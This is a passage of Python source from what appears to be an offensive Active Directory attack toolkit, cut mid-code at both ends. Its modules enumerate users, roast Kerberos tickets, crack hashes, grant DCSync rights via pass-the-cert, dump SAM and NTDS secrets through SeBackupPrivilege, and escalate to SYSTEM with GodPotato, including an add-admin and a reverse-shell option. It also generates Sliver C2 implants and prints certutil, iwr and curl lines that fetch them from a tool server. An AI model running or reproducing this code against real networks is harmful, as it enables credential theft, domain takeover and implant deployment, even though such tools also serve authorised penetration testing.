            if kb and target.domain:
                wl = existing_ul or self.ask('username wordlist','/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt')
                if wl and os.path.isfile(wl):
                    out = os.path.join(target.loot_dir,'kerbrute_users.txt')
                    _, lines = run_cmd_capture([kb,'userenum','-d',target.domain,'--dc',target.dc,wl,'-o',out], label='kerbrute userenum')
                    # parse valid users from kerbrute output
                    import re as _re
                    for l in lines:
                        m = _re.search(r'VALID USERNAME:\s*(\S+)', l)
                        if m: users_found.append(m.group(1).split('@')[0])
                    if users_found: _save_users(list(set(users_found)), target.loot_dir, target.domain)
                else:
                    log(f'Wordlist not found — try: {WHITE}sudo apt install seclists{RESET}','warn')
            elif not kb:
                log('kerbrute not found — run: install','warn')

        if action in ('all','asreproast'):
            t2 = check_tool('impacket-GetNPUsers','GetNPUsers.py')
            if t2 and target.domain:
                out = os.path.join(target.loot_dir,'asreproast_hashes.txt')
                if existing_ul:
                    log(f'AS-REP roasting with {WHITE}{existing_ul}{RESET}...','info')
                    run_cmd([t2,f'{target.domain}/','-dc-ip',target.dc,
                             '-format','hashcat','-outputfile',out,'-no-pass','-usersfile',existing_ul],
                            label='GetNPUsers unauthenticated')
                else:
                    log(f'{ORANGE}No user list yet — run userenum or rid first{RESET}','warn')
                if os.path.exists(out):
                    hs = [l for l in open(out, errors='replace').read().splitlines() if '$krb5asrep$' in l]
                    if hs:
                        log(f'{len(hs)} AS-REP hash(es) → {WHITE}{out}{RESET}','success'); add_result('asreproast', f'{len(hs)} AS-REP hash(es)')
                        for h in hs: print(f'  {PINK}{h[:100]}{"..." if len(h)>100 else ""}{RESET}')
                        print(f'  {WHITE}hashcat -m 18200 {out} rockyou.txt{RESET}')

        if users_found:
            unique = sorted(set(users_found))
            log(f'{GREEN}{len(unique)} total users found → {WHITE}{ul}{RESET}','success')
        hr()


# =============================================================================
# HASHCRACK — auto-detect hash type and launch hashcat
# =============================================================================
class HashCrack(Module):
    name='hashcrack'; description='hashcat -- auto-detect hash type from loot and crack with wordlist'; category='credentials'
    def run(self, target):
        hashcat = self.need('hashcat')
        if not hashcat: return
        hr()
        import re as _re6, glob as _gl2

        # auto-find hash files in loot
        loot = target.loot_dir
        hash_files = {}
        checks = [
            (os.path.join(loot,'timeroast_hashes.txt'),  27100, 'Timeroast (NTP)'),
            (os.path.join(loot,'asreproast_hashes.txt'), 18200, 'AS-REP hashes'),
            (os.path.join(loot,'kerberoast_hashes.txt'), 13100, 'Kerberoast hashes'),
            (os.path.join(loot,'responder_hashes.txt'),  5600,  'NTLMv2 (Responder)'),
            (os.path.join(loot,'dcsync.txt.ntds'),       1000,  'NT hashes (DCSync)'),
        ]
        for path, mode, label in checks:
            if os.path.exists(path) and os.path.getsize(path) > 0:
                hash_files[label] = (path, mode)

        # also scan loot dir for any file containing known hash patterns
        for f in _gl2.glob(os.path.join(loot,'*.txt')):
            if f in [p for p,_ in hash_files.values()]: continue
            try:
                sample = open(f, errors='ignore').read(2000)
                if '$sntp-ms$' in sample and 'Timeroast' not in str(hash_files):
                    hash_files[f'Timeroast ({os.path.basename(f)})'] = (f, 27100)
                elif '$krb5asrep$' in sample:
                    hash_files[f'AS-REP ({os.path.basename(f)})'] = (f, 18200)
                elif '$krb5tgs$' in sample:
                    hash_files[f'Kerberoast ({os.path.basename(f)})'] = (f, 13100)
            except: pass

        if not hash_files:
            log(f'No hash files found in {WHITE}{loot}{RESET}','warn')
            hfile = self.ask('hash file path')
            mode  = self.ask('hashcat mode','1000')
            if not hfile: hr(); return
        else:
            log('Hash files found in loot:','info')
            choices = list(hash_files.keys())
            for i, label in enumerate(choices):
                path, mode = hash_files[label]
                count = sum(1 for l in open(path) if l.strip())
                print(f'  {GREEN}{i+1}{RESET}  {WHITE}{label}{RESET}  {GREY}({count} hashes) mode -{mode}{RESET}')
            choice = self.ask('select','1')
            try:
                label = choices[int(choice)-1]
                hfile, mode = hash_files[label]
                mode = str(mode)
            except Exception:
                log('Invalid choice','error'); hr(); return

        wl = self.ask('wordlist','/usr/share/wordlists/rockyou.txt')
        rules = self.ask('rules (blank = none)','')
        hr()

        # ── Weakpass API pre-check ────────────────────────────────────────────
        # For NT hashes (mode 1000) check weakpass.com before running hashcat
        if mode == '1000' or mode == 1000:
            log(f'{GREY}Checking Weakpass API for instant NTLM lookups...{RESET}','info')
            try:
                import urllib.request as _ur, json as _js
                weakpass_hits = {}
                with open(hfile, errors='ignore') as _f:
                    raw_lines = [l.strip() for l in _f if l.strip()]
                # extract NT hashes — format: user:rid:lm:nt::: or just hash
                nt_hashes = {}
                for line in raw_lines:
                    parts = line.split(':')
                    if len(parts) >= 4 and len(parts[3]) == 32:
                        nt_hashes[parts[3].lower()] = parts[0]  # hash → username
                    elif len(parts) == 1 and len(parts[0]) == 32:
                        nt_hashes[parts[0].lower()] = parts[0]

                for nt, username in list(nt_hashes.items())[:20]:  # max 20 lookups
                    try:
                        url = f'https://weakpass.com/api/v1/search/{nt}'
                        req = _ur.Request(url, headers={'User-Agent':'segfault-ad'})
                        resp = _ur.urlopen(req, timeout=5)
                        data = _js.loads(resp.read())
                        if data.get('found') and data.get('password'):
                            pw = data['password']
                            weakpass_hits[nt] = (username, pw)
                            log(f'{GREEN}Weakpass hit: {WHITE}{username}{RESET}{GREEN}:{WHITE}{pw}{RESET}','success')
                    except Exception:
                        pass

                if weakpass_hits:
                    log(f'{GREEN}{len(weakpass_hits)} instant crack(s) via Weakpass API{RESET}','success')
                    cracked_path = os.path.join(loot, 'cracked.txt')
                    with open(cracked_path, 'a') as _cf:
                        for nt, (user, pw) in weakpass_hits.items():
                            _cf.write(f'{user}:{pw}\n')
                    ws = os.path.basename(target.loot_dir)
                    for nt, (user, pw) in weakpass_hits.items():
                        _db_save_cred(ws, target.domain, user, pw, source='weakpass')
                    add_result('hashcrack', f'{len(weakpass_hits)} weakpass hit(s)')
                else:
                    log(f'{GREY}No Weakpass hits — proceeding with hashcat{RESET}','info')
            except Exception as _e:
                log(f'{GREY}Weakpass API unavailable — proceeding with hashcat{RESET}','info')
        elif mode in ('18200', 18200, '13100', 13100):
            # For AS-REP/Kerberoast hashes check weakpass too
            log(f'{GREY}Checking Weakpass API...{RESET}','info')
            try:
                import urllib.request as _ur2, json as _js2
                with open(hfile, errors='ignore') as _f2:
                    hash_lines = [l.strip() for l in _f2 if l.strip()]
                for line in hash_lines[:10]:
                    try:
                        # extract password portion after last : for known format
                        url = f'https://weakpass.com/api/v1/search/{line}'
                        req = _ur2.Request(url, headers={'User-Agent':'segfault-ad'})
                        resp = _ur2.urlopen(req, timeout=5)
                        data = _js2.loads(resp.read())
                        if data.get('found') and data.get('password'):
                            log(f'{GREEN}Weakpass hit: {WHITE}{data["password"]}{RESET}','success')
                    except Exception:
                        pass
            except Exception:
                pass

        cmd = [hashcat,'-m',mode, hfile, wl,'--force','--status','--status-timer=10']
        if rules: cmd += ['-r', rules]
        log(f'{C0}hashcat -m {mode}{RESET} — cracking...','info')
        proc_hc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        hc_lines, rc_hc = _progress_proc(proc_hc, f'hashcat -m {mode}',
            grep_pattern=r'Cracked|\$krb5|:\w{8,}$|Status.*Cracked')

        # show cracked
        cracked = []
        try:
            show_cmd = [hashcat,'-m',mode,hfile,'--show']
            out_hc = subprocess.check_output(show_cmd, text=True, stderr=subprocess.DEVNULL)
            cracked = [l.strip() for l in out_hc.splitlines() if ':' in l and l.strip()]
            if cracked:
                log(f'{GREEN}{len(cracked)} password(s) cracked:{RESET}','success')
                for c in cracked: print(f'  {GREEN}{c}{RESET}')
                add_result('hashcrack', f'{len(cracked)} pwd cracked')
                # auto cred reuse for new credentials
                try:
                    for line in cracked[:3]:  # max 3 to avoid flooding
                        m = re.search(r'\\?([^:$\s]+):([^:$\s]{4,})$', line)
                        if m and not m.group(2).startswith('aad3b435'):
                            _auto_cred_reuse(target, m.group(1), new_pass=m.group(2))
                except Exception: pass
                with open(os.path.join(loot,'cracked.txt'),'a') as _f:
                    _f.write('\n'.join(cracked)+'\n')
                # save to DB
                ws = os.path.basename(target.loot_dir)
                for line in cracked:
                    # try user:password format
                    m = re.search(r'\$krb5(?:asrep|tgs)\$\d+\$([^@$]+)[@$][^:]*:[^:]+:(.+)$', line)
                    if m:
                        _db_save_cred(ws, target.domain, m.group(1), m.group(2), source='hashcrack')
                        _db_mark_cracked(line.split(':')[0] if ':' in line else line, m.group(2))
                    elif ':' in line and not line.startswith('$'):
                        u, p = line.split(':',1)
                        _db_save_cred(ws, target.domain, u, p, source='hashcrack')
                # also save user:pass format for autopwn pivot
                _plain_passwords = []
                for line in cracked:
                    # krb5asrep: $krb5asrep$23$user@domain:salt$hash:password
                    m = re.search(r'\$krb5asrep\$\d+\$([^@]+)@[^:]+:[^:]+:(.+)$', line)
                    if m:
                        upass = f'{m.group(1).lower()}:{m.group(2)}'
                        with open(os.path.join(loot,'cracked.txt'),'a') as _f:
                            _f.write(upass+'\n')
                        log(f'{GREEN}Saved: {WHITE}{upass}{RESET}','success')
                        _plain_passwords.append(m.group(2))
                    elif ':' in line and not line.startswith('$'):
                        _plain_passwords.append(line.split(':',1)[1])

                # ── password pattern generator ────────────────────────────
                if _plain_passwords:
                    _gen_password_patterns(_plain_passwords, loot)
        except Exception: pass

        # john fallback — especially useful for AES AS-REP hashes
        if not cracked:
            log(f'{ORANGE}hashcat found nothing — trying john (better AES support){RESET}','warn')
            john = check_tool('john')
            if john:
                run_cmd([john, hfile, f'--wordlist={wl}'], label='john fallback')
                try:
                    john_out = subprocess.check_output([john, hfile, '--show'],
                        text=True, stderr=subprocess.DEVNULL)
                    j_cracked = [l.strip() for l in john_out.splitlines()
                                 if ':' in l and not l.startswith('0 password')]
                    if j_cracked:
                        log(f'{GREEN}{len(j_cracked)} password(s) cracked by john:{RESET}','success')
                        for c in j_cracked: print(f'  {GREEN}{c}{RESET}')
                        add_result('hashcrack', f'{len(j_cracked)} pwd cracked (john)')
                        with open(os.path.join(loot,'cracked.txt'),'a') as _f:
                            _f.write('\n'.join(j_cracked)+'\n')
                    else:
                        # remove hashcrack from results if it was added earlier and nothing cracked
                        global _SESSION_RESULTS
                        _SESSION_RESULTS = [r for r in _SESSION_RESULTS if r['module'] != 'hashcrack']
                except Exception: pass
        hr()


# =============================================================================
# ADDCOMPUTER — add a fake machine account to the domain
# =============================================================================
class AddComputer(Module):
    name='addcomputer'; description='add machine account to domain -- abuse MachineAccountQuota for ESC1/RBCD/etc'; category='exploitation'
    def run(self, target):
        if not self.req(target): return
        hr()
        log(f'MachineAccountQuota allows domain users to add up to 10 computer accounts','info')
        log(f'Useful for ESC1 (computer enrollment), RBCD, and other attacks','info')
        hr()

        comp_name = self.ask('computer name (without $)','EVILPC')
        comp_pass = self.ask('computer password','Passw0rd123!')

        # try impacket-addcomputer first
        addcomp = check_tool('impacket-addcomputer','addcomputer.py')
        bloody  = check_tool('bloodyad','bloodyAD')

        auth_str = f'{target.domain}/{target.user}'
        if target.password: auth_str += f':{target.password}'

        if addcomp:
            cmd = [addcomp, auth_str,
                   '-dc-ip', target.dc,
                   '-computer-name', f'{comp_name}$',
                   '-computer-pass', comp_pass]
            if target.hash: cmd += ['-hashes', f':{target.hash}']
            run_cmd(cmd, label='addcomputer')
        elif bloody:
            base = [bloody,'--host',target.dc,'-d',target.domain,'-u',target.user]
            if target.password: base += ['-p',target.password]
            elif target.hash:   base += ['-p',f':{target.hash}']
            run_cmd(base+['add','computer',f'{comp_name}$',comp_pass], label='bloodyAD add computer')
        else:
            log('impacket-addcomputer not found','error')
            log(f'Install: {WHITE}pip install impacket --break-system-packages{RESET}','info')
            hr(); return

        log(f'{GREEN}Computer account created:{RESET}','success')
        log(f'  name:     {WHITE}{comp_name}${RESET}','info')
        log(f'  password: {WHITE}{comp_pass}{RESET}','info')
        log(f'  use with: {C0}certipy esc1{RESET} or {C0}rbcd{RESET} modules','info')
        log(f'  set as target: {WHITE}pivot → {comp_name}$ / {comp_pass}{RESET}','info')

        # check MachineAccountQuota first
        nxc = check_tool('netexec','nxc')
        if nxc:
            log(f'Checking MachineAccountQuota...','info')
            run_cmd([nxc,'ldap',target.dc]+target.nxc_args()+['--get-network','--ms-account-quota'],
                    label='check quota')
        hr()


# =============================================================================
# PASS-THE-CERT — authenticate via LDAP using a certificate (Schannel)
# =============================================================================
class PassTheCert(Module):
    name='passthecert'; description='pass-the-cert -- LDAP Schannel auth with PFX to dump hashes / grant DCSync'; category='lateral'
    def run(self, target):
        if not self.req(target): return
        hr()
        log(f'Pass-the-cert abuses LDAP Schannel auth with a certificate','info')
        log(f'Useful when PKINIT fails but LDAP is available (e.g. Authority ESC1 chain)','info')
        hr()

        action = self.ask('action','dcsync', ['dcsync','adduser','rbcd','custom'])
        pfx    = self.ask('PFX file')
        pfx_pw = self.ask('PFX password (blank = none)','')

        ptc = check_tool('passthecert.py','passthecert')
        if not ptc:
            log(f'passthecert.py not found','error')
            log(f'Install: {WHITE}git clone https://github.com/AlmondOffSec/PassTheCert ./tools/PassTheCert{RESET}','info')
            hr(); return

        # always run via python3 to avoid permission issues
        # split pfx into crt+key for passthecert
        import tempfile as _tmp
        crt_f = pfx.replace('.pfx','.crt')
        key_f = pfx.replace('.pfx','.key')
        pfx_pass_arg = ['-passin',f'pass:{pfx_pw}'] if pfx_pw else ['-passin','pass:']
        subprocess.run(['openssl','pkcs12','-in',pfx,'-clcerts','-nokeys','-out',crt_f,'-nodes']+pfx_pass_arg,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['openssl','pkcs12','-in',pfx,'-nocerts','-out',key_f,'-nodes']+pfx_pass_arg,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if not os.path.exists(crt_f) or not os.path.exists(key_f):
            log(f'Failed to extract crt/key from PFX','error'); hr(); return
        log(f'Extracted: {WHITE}{crt_f}{RESET} + {WHITE}{key_f}{RESET}','info')

        base = ['python3', ptc,
                '-crt', crt_f, '-key', key_f,
                '-domain', target.domain,
                '-dc-ip', target.dc]

        if action == 'dcsync':
            user = self.ask('user to grant DCSync rights', target.user or '')
            # passthecert uses modify_user + -elevate to grant DCSync
            run_cmd(base+['-action','modify_user','-target',user,'-elevate'],
                    label='passthecert grant DCSync')
            log(f'{GREEN}DCSync rights granted to {WHITE}{user}{RESET} — now run: {C0}dcsync{RESET}','success')
        elif action == 'adduser':
            new_user = self.ask('new username','hacker')
            new_pass = self.ask('new password','Passw0rd123!')
            run_cmd(base+['-action','add_computer','-computer-name',new_user,'-computer-pass',new_pass],
                    label='passthecert adduser')
        elif action == 'rbcd':
            comp     = self.ask('computer account to set RBCD on')
            delegate = self.ask('delegate from (attacker computer$)')
            run_cmd(base+['-action','write_rbcd','-target',comp,'-delegate-from',delegate],
                    label='passthecert rbcd')
        elif action == 'custom':
            extra = self.ask('extra args')
            run_cmd(base+extra.split(), label='passthecert custom')
        hr()


# =============================================================================
# GROUPSCOPE — flip AD group scope for cross-domain SID injection
# =============================================================================
class GroupScope(Module):
    name='groupscope'; description='flip group scope Global→Universal→DomainLocal to accept foreign SIDs (cross-domain trust abuse)'; category='exploitation'
    def run(self, target):
        if not self.req(target): return
        hr()
        log(f'DomainLocal groups accept SIDs from any trusted domain — Global groups do not','info')
        log(f'Chain: Global → Universal → DomainLocal → add foreign SID as member','info')
        hr()
        group = self.ask('group name')
        server = self.ask('DC server', target.dc_fqdn or target.dc)

        bloody = check_tool('bloodyad','bloodyAD')
        if bloody:
            base = [bloody,'--host',server,'-d',target.domain,'-u',target.user]
            if os.environ.get('KRB5CCNAME'): base += ['-k']
            elif target.password: base += ['-p',target.password]
            elif target.hash: base += ['-p',f':{target.hash}']

            log(f'Step 1: Global → Universal','info')
            run_cmd(base+['set','object',group,'groupType','-v','-2147483640'],
                    label='bloodyAD set Universal')
            log(f'Step 2: Universal → DomainLocal','info')
            run_cmd(base+['set','object',group,'groupType','-v','-2147483644'],
                    label='bloodyAD set DomainLocal')
            log(f'{GREEN}Group is now DomainLocal — add foreign SID with addtogroup','success')
        else:
            # PowerShell fallback
            log(f'bloodyAD not found — use PowerShell in WinRM session:','warn')
            print(f'  Set-ADGroup "{group}" -GroupScope Universal -Server {server}')
            print(f'  Set-ADGroup "{group}" -GroupScope DomainLocal -Server {server}')
        hr()

# =============================================================================
# JEA — connect to JEA restricted PowerShell endpoint
# =============================================================================
class JEA(Module):
    name='jea'; description='JEA endpoint -- connect to restricted PowerShell session via pypsrp, read history/run allowed cmdlets'; category='lateral'
    def run(self, target):
        if not self.req(target): return
        hr()
        log(f'JEA (Just Enough Administration) restricts cmdlets but runs as the configured account','info')
        log(f'Key: set dns_canonicalize_hostname=false in /etc/krb5.conf for Kerberos auth','warn')
        hr()

        host    = self.ask('target host', target.dc_fqdn or target.dc)
        action  = self.ask('action','history',['history','cmd','whoami'])

        try:
            import pypsrp.client as _psp
        except ImportError:
            log(f'pypsrp not found','error')
            log(f'Install: {WHITE}pip install pypsrp --break-system-packages{RESET}','info')
            hr(); return

        ccache = os.environ.get('KRB5CCNAME','')
        auth = 'kerberos' if ccache and os.path.exists(ccache) else 'negotiate'
        log(f'Connecting to {WHITE}{host}{RESET} via pypsrp ({auth})...','info')

        try:
            c = _psp.Client(host, auth=auth, ssl=False, connection_timeout=15)
            if action == 'history':
                ps = (
                    '$paths = @(' +
                    '  "C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",' +
                    '  "C:\\Users\\*\\AppData\\Local\\Temp\\*.txt",' +
                    '  "C:\\Users\\*\\Desktop\\*.txt"' +
                    '); foreach ($p in $paths) { try { Get-Item $p -EA Stop | %{ Write-Host "=== $($_.FullName) ==="; Get-Content $_ } } catch {} }'
                )
            elif action == 'whoami':
                ps = 'whoami; whoami /groups; whoami /priv'
            else:
                ps = self.ask('PowerShell command to run')

            out, streams, _ = c.execute_ps(ps)
            if out: print(f'\n{out}\n')
            if streams.error:
                for e in streams.error: log(str(e),'warn')
        except Exception as e:
            log(f'JEA connection failed: {e}','error')
            log(f'Ensure krb5.conf has dns_canonicalize_hostname=false','warn')
        hr()

# =============================================================================
# BACKUPABUSE — SeBackupPrivilege → dump SAM/SYSTEM/NTDS → Administrator hash
# =============================================================================
class BackupAbuse(Module):
    name='backupabuse'; description='SeBackupPrivilege abuse — dump SAM+SYSTEM or NTDS.dit via reg save / diskshadow'; category='exploitation'
    def run(self, target):
        if not self.req(target): return
        hr()
        mode = self.ask('mode','sam',['sam','ntds','check'])
        hr()

        ewrm   = check_tool('evil-winrm')
        dc     = target.dc_fqdn or target.dc
        loot   = target.loot_dir
        os.makedirs(loot, exist_ok=True)

        if mode == 'check':
            log('Checking for SeBackupPrivilege via wmiexec...','info')
            auth, extra = target.imp_str()
            wmi = check_tool('impacket-wmiexec','wmiexec.py')
            if wmi:
                out = subprocess.check_output([wmi]+auth+extra+['whoami /priv'],
                    stderr=subprocess.DEVNULL, text=True, errors='replace', timeout=10)
                if 'SeBackupPrivilege' in out:
                    log(f'{GREEN}SeBackupPrivilege is ENABLED — run backupabuse → sam or ntds{RESET}','success')
                    add_result('backupabuse','SeBackupPrivilege confirmed')
                else:
                    log(f'{RED}SeBackupPrivilege not found{RESET}','error')
            hr(); return

        elif mode == 'sam':
            log('SeBackupPrivilege → dump SAM + SYSTEM hives','info')
            log(f'{ORANGE}Run these commands inside evil-winrm shell:{RESET}','warn')
            log(f'  {C0}reg save HKLM\\SAM C:\\Windows\\Temp\\sam.bak{RESET}','info')
            log(f'  {C0}reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.bak{RESET}','info')
            log(f'  {C0}download C:\\Windows\\Temp\\sam.bak{RESET}','info')
            log(f'  {C0}download C:\\Windows\\Temp\\system.bak{RESET}','info')
            log(f'{PINK}Opening evil-winrm shell...{RESET}','info')
            hr()

            if ewrm:
                if target.hash:
                    cmd = [ewrm,'-i',dc,'-u',target.user,'-H',target.hash]
                elif target.password:
                    cmd = [ewrm,'-i',dc,'-u',target.user,'-p',target.password]
                else:
                    log('Set creds first','error'); hr(); return
                pid = os.fork()
                if pid == 0:
                    os.execvp(cmd[0], cmd)
                else:
                    os.waitpid(pid, 0)

            # after shell exits, check if files were downloaded
            sam_path    = os.path.join(os.getcwd(), 'sam.bak')
            system_path = os.path.join(os.getcwd(), 'system.bak')
            # evil-winrm downloads to cwd
            for f in ['sam.bak','system.bak']:
                if os.path.exists(f):
                    import shutil as _sh
                    _sh.move(f, os.path.join(loot, f))
                    log(f'{GREEN}Moved {f} → {loot}{RESET}','success')

            sam    = os.path.join(loot,'sam.bak')
            system = os.path.join(loot,'system.bak')
            if os.path.exists(sam) and os.path.exists(system):
                log('Dumping hashes from SAM + SYSTEM...','info')
                sd = check_tool('impacket-secretsdump','secretsdump.py')
                if sd:
                    rc, lines = run_cmd_capture(
                        [sd,'-sam',sam,'-system',system,'LOCAL'],
                        label='secretsdump LOCAL')
                    # parse Administrator hash
                    for l in lines:
                        if 'Administrator:' in l and ':::' in l:
                            parts = l.split(':')
                            if len(parts) >= 4:
                                nt = parts[3].strip()
                                log(f'{GREEN}Administrator NT: {WHITE}{nt}{RESET}','success')
                                target.user = 'Administrator'
                                target.hash = nt
                                target.password = None
                                TARGET.user = 'Administrator'
                                TARGET.hash = nt
                                TARGET.password = None
                                with open(os.path.join(loot,'cracked.txt'),'a') as f:
                                    f.write(f'Administrator:{nt}\n')
                                add_result('backupabuse', f'Administrator hash: {nt[:8]}…')
                                log(f'{GREEN}Pivoted to Administrator — run dcsync or exec{RESET}','success')
                                break
            else:
                log(f'{ORANGE}sam.bak/system.bak not found in {loot} — download them inside the shell first{RESET}','warn')

        elif mode == 'ntds':
            log('SeBackupPrivilege → dump NTDS.dit via diskshadow','info')
            log(f'{ORANGE}Run these commands inside evil-winrm shell:{RESET}','warn')
            log(f'  {C0}diskshadow /s C:\\Windows\\Temp\\shadow.dsh{RESET}','info')
            log(f'  Create shadow.dsh with:{RESET}','info')
            log(f'    {C0}set context persistent nowriters{RESET}','info')
            log(f'    {C0}add volume c: alias seg{RESET}','info')
            log(f'    {C0}create{RESET}','info')
            log(f'    {C0}expose %seg% z:{RESET}','info')
            log(f'  Then copy: {C0}robocopy /b z:\\Windows\\NTDS . ntds.dit{RESET}','info')
            log(f'  And: {C0}reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.bak{RESET}','info')
            log(f'  Download both and run secretsdump','info')
            hr()
            if ewrm:
                if target.password:
                    cmd = [ewrm,'-i',dc,'-u',target.user,'-p',target.password]
                elif target.hash:
                    cmd = [ewrm,'-i',dc,'-u',target.user,'-H',target.hash]
                else:
                    log('Set creds first','error'); hr(); return
                pid = os.fork()
                if pid == 0:
                    os.execvp(cmd[0], cmd)
                else:
                    os.waitpid(pid, 0)
        hr()


# =============================================================================
# SLIVER — generate implant via Sliver C2 + upload to Hivemind tool server
# =============================================================================
class SliverModule(Module):
    name='sliver'; description='Sliver C2 — generate implant, upload to Hivemind tool server, get download cmd'; category='exploitation'
    def run(self, target):
        hr()
        log(f'{C0}Sliver C2 implant generator{RESET}','info')

        # check hivemind state
        hm       = _load_hivemind_state()
        redirector = hm.get('redirector','')
        toolserver = hm.get('toolserver','')
        tools_port = hm.get('tools_port','443')

        if not redirector:
            log(f'{ORANGE}Hivemind not configured — using tun0 as lhost{RESET}','warn')
            lhost = _get_tun0() or self.ask('lhost IP','')
        else:
            lhost = redirector
            log(f'Using Hivemind redirector: {WHITE}{lhost}{RESET}','info')

        lport  = self.ask('lport','8888')
        os_    = self.ask('OS','windows',['windows','linux','macos'])
        arch   = self.ask('arch','amd64',['amd64','386','arm64'])
        fmt    = self.ask('format','exe',['exe','shared','shellcode'])
        symbols = self.ask('symbol obfuscation (slow on Pi)','n',['y','n'])
        skip   = '--skip-symbols' if symbols == 'n' else ''

        # build sliver-client generate command
        ext_map = {'exe':'.exe','shared':'.dll','shellcode':'.bin'}
        ext = ext_map.get(fmt,'.exe')

        save_dir = os.path.expanduser('~/.segfault-ad/loot/payloads')
        os.makedirs(save_dir, exist_ok=True)

        sliver_cmd = f'generate --os {os_} --arch {arch} --mtls {lhost}:{lport} --format {fmt} --save {save_dir}/ {skip}'

        log(f'{GREY}Run in sliver-client:{RESET}','info')
        log(f'  {C0}{sliver_cmd}{RESET}','info')
        hr()

        ans = self.ask('open sliver-client now','y',['y','n'])
        if ans == 'y':
            # check for existing implant files
            before = set(os.listdir(save_dir))
            subprocess.run(['sliver-client'], cwd=save_dir)
            after  = set(os.listdir(save_dir))
            new    = after - before
            if new:
                fname = sorted(new)[-1]
                fpath = os.path.join(save_dir, fname)
                log(f'{GREEN}Implant generated: {WHITE}{fname}{RESET}','success')

                # upload to tool server if configured
                if toolserver:
                    url = hivemind_upload(fpath)
                    if url:
                        log(f'\n{C0}Download commands:{RESET}','info')
                        log(f'  {GREY}Windows (certutil):{RESET}','info')
                        print(f'    {C0}certutil -urlcache -split -f {url} C:\\Windows\\Temp\\{fname}{RESET}')
                        log(f'  {GREY}Windows (powershell):{RESET}','info')
                        print(f'    {C0}iwr {url} -o C:\\Windows\\Temp\\{fname}{RESET}')
                        log(f'  {GREY}Linux:{RESET}','info')
                        print(f'    {C0}curl -k {url} -o /tmp/{fname}{RESET}')
                        add_result('sliver', f'implant → {lhost}:{lport}')
                else:
                    log(f'Implant saved to: {WHITE}{fpath}{RESET}','success')
                    log(f'Upload manually or configure Hivemind tool server','info')
            else:
                log('No new implant found — generate one inside sliver-client','warn')
        hr()


# =============================================================================
# GODPOTATO — SeImpersonatePrivilege → SYSTEM via GodPotato
# =============================================================================
class GodPotato(Module):
    name='godpotato'; description='GodPotato -- SeImpersonatePrivilege → SYSTEM (Windows 2012-2022)'; category='exploitation'
    def run(self, target):
        if not self.req(target): return
        hr()
        log(f'GodPotato abuses SeImpersonatePrivilege to get a SYSTEM token','info')
        log(f'Works on Windows Server 2012-2022 — no patch available','info')
        hr()

        gp_remote = self.ask('GodPotato.exe path on target',r'C:\ProgramData\gp.exe')
        action = self.ask('action','addadmin',['addadmin','revshell','custom'])

        if action == 'addadmin':
            user = self.ask('user to add to local admins', target.user or '')
            domain = self.ask('domain', target.domain or '')
            cmd = f'cmd /c net localgroup administrators {domain}\\{user} /add'
        elif action == 'revshell':
            lhost = self.ask('LHOST (your IP)', _hivemind_redirector() or _get_tun0() or '');
            if _hivemind_redirector() and lhost == _hivemind_redirector(): log(f'Using Hivemind redirector: {WHITE}{lhost}{RESET}','info')
            lport = self.ask('LPORT','4444')
            cmd = f'cmd /c powershell -e JABjAGwAaQBlAG4AdA...' # base64 rev shell placeholder
            log(f'Generate base64 payload with: {WHITE}msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f ps1{RESET}','info')
        else:
            cmd = self.ask('command to run as SYSTEM')

        mssql_cmd = f'EXEC xp_cmdshell \'{gp_remote} -cmd "{cmd}"\''
        log(f'Run in MSSQL session:','info')
        hr()
        print(f'  {WHITE}{mssql_cmd}{RESET}')
        hr()
        log(f'Or use via MSSQL module → cmd action','info')

        # if we have a wmiexec-style shell, try direct execution
        wmi = check_tool('impacket-wmiexec','wmiexec.py')
        if wmi and target.user and (target.password or target.hash):
            choice = self.ask('execute now via wmiexec?','n',['y','n'])
            if choice == 'y':
                auth, hashes = target.imp_str()
                run_cmd([wmi]+hashes+auth+[f'{gp_remote} -cmd "{cmd}"'],
                        label='GodPotato via wmiexec')
        hr()


# =============================================================================
# PYWHISKER — shadow credentials via pywhisker (better PKINIT compat)
# =============================================================================
class PyWhisker(Module):
    name='pywhisker'; description='pywhisker -- shadow credentials add/list/clear (generates PFX with password for gettgtpkinit)'; category='exploitation'
    def run(self, target):
        if not self.req(target): return
        hr()
        # find pywhisker
        pw = check_tool('pywhisker')
        pw_script = None
        if not pw:
            for p in [os.path.expanduser('~/.segfault-ad/tools/pywhisker/pywhisker/pywhisker.py'),
                      os.path.expanduser('~/.segfault-ad/tools/pywhisker/pywhisker/pywhisker.py'),
                      '/opt/pywhisker/pywhisker/pywhisker.py']:
                if os.path.exists(p): pw_script = p; break
        if not pw and not pw_script:
            log('pywhisker not found','error')
            log(f'Install: git clone https://github.com/ShutdownRepo/pywhisker ~/.segfault-ad/tools/pywhisker','info')
            hr(); return

        t_user = self.ask('target user/computer')
        action = self.ask('action','add',['add','list','remove','clear'])
        if not t_user: hr(); return

        ccache = os.environ.get('KRB5CCNAME','')
        use_krb = ccache and os.path.exists(ccache)

        base = ['python3', pw_script or pw,
                '-d', target.domain,
                '-u', target.user,
                '-t', t_user,
                '--action', action,
                '--dc-ip', target.dc]

        if use_krb:
            base += ['-k', '--no-pass']
            log(f'Using Kerberos ccache: {WHITE}{ccache}{RESET}','info')
        elif target.password:
            base += ['-p', target.password]
        elif target.hash:
            base += ['-H', target.hash]

        if action == 'add':
            # save PFX to loot dir
            pfx_out = os.path.join(target.loot_dir, t_user)
            base += ['-o', pfx_out]

        rc, lines = run_cmd_capture(base, label='pywhisker')

        if action == 'add':
            # parse PFX filename and password from output
            pfx_file = None; pfx_pass = None
            for l in lines:
                m = re.search(r'Saved PFX.*?path: (\S+)', l)
                if m: pfx_file = m.group(1)
                m2 = re.search(r'Must be used with password: (\S+)', l)
                if m2: pfx_pass = m2.group(1)
                # also match german locale
                m3 = re.search(r'PFX exportiert nach: (\S+)', l)
                if m3: pfx_file = m3.group(1)
                m4 = re.search(r'Passwort.*?PFX: (\S+)', l)
                if m4: pfx_pass = m4.group(1)

            if pfx_file and pfx_pass:
                # move to loot if not already there
